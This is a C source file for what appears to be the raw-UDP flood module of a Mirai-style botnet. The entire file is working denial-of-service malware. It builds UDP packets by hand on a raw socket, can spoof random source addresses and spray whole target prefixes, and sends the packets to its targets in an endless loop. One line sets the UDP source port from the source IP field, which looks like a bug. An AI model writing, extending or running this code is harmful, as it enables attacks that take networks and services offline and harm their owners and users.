#define _GNU_SOURCE

#include "../../attack.h"

void flood_udpraw(struct flood *flood)
{
        int i, fd;
    char **pkts = calloc(flood->num_of_targets, sizeof(char *));
    flood->settings->dont_fragment = get_option_number(flood->num_of_options, flood->options, OPT_IP_DF, FALSE);

    if (flood->settings->length > 1460)
        flood->settings->length = 1460;

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < flood->num_of_targets; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;

        pkts[i] = calloc(1510, sizeof(char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = flood->settings->tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + flood->settings->length);
        iph->id = htons(flood->settings->ident);
        iph->ttl = flood->settings->ttl;
        if (flood->settings->dont_fragment)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = flood->settings->source_ip;
        iph->daddr = flood->targets[i].addr;

        udph->source = htons(flood->settings->source_ip);
        udph->dest = htons(flood->settings->dest_port);
        udph->len = htons(sizeof(struct udphdr) + flood->settings->length);
    }

    while (TRUE)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            char *data = (char *)(udph + 1);

            // For prefix attacks
            if (flood->targets[i].netmask < 32)
                iph->daddr = htonl(ntohl(flood->targets[i].addr) + (((uint32_t)rand_next()) >> flood->targets[i].netmask));

            if (flood->settings->source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (flood->settings->ident == 0xffff)
                iph->id = (uint16_t)rand_next();
            if (flood->settings->source_port == 0xffff)
                udph->source = rand_next();
            if (flood->settings->dest_port == 0xffff)
                udph->dest = rand_next();

            // Randomize packet content?
            if (flood->settings->random_data)
                rand_str(data, flood->settings->length);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + flood->settings->length);

            flood->targets[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + flood->settings->length, MSG_NOSIGNAL, (struct sockaddr *)&flood->targets[i].sock_addr, sizeof(struct sockaddr_in));
        }
#ifdef DEBUG
        break;
        if (errno != 0)
            printf("errno = %d\n", errno);
#endif
    }
}
